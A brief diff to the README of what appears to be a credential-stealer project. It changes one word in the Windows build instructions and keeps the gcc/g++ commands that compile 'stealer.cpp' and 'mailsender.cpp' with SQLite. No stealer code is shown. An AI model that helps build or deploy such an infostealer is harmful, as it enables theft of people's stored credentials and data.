@@ -8,7 +8,7 @@ gcc -c sqlite3.c
 g++ -o <programname> stealer.cpp mailsender.cpp sqlite3.o -ldl -pthread -std=c++1z
 ```
   
-And for Windows you have to execute following command using MinGW:
+And for Windows you have to execute following commands using MinGW:
 ```
 gcc -c sqlite3.c
 g++ -o <programname> stealer.cpp mailsender.cpp sqlite3.o -std=c++1z
